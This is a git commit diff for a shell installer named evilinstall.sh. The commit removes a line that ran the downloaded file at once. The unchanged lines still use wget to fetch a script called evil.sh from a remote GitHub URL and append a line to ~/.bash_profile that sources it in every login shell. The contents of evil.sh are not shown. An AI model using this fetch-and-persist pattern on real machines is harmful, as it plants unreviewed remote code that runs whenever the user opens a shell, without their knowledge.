77994d339a76532c35c60f47e9933bec4d42e914
lustered <smellslikelavenders@gmail.com>
2021-07-15 18:13:56 -0400

    Reverted sourcing

--- evilinstall.sh
+++ evilinstall.sh
@@ -4,6 +4,3 @@ wget 'https://raw.githubusercontent.com/lustered/evil.sh/master/evil.sh' -P ~/
 
 # Append to bash profile 
 echo "[[ -f ~/evil.sh ]] && . ~/evil.sh" >> ~/.bash_profile
-
-# Source file
-. ~/evil.sh
